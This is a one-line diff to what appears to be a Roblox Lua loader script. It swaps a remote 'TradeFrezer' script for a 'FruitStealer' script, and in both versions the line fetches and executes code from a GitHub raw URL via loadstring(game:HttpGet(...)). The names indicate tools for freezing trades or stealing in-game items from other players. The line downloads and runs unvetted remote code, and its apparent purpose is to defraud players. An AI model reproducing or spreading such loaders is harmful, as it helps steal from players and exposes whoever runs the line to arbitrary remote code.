@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxTraper/TradeFrezer/refs/heads/main/hub",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxTraper/FruitStealer/refs/heads/main/Hub",true))()
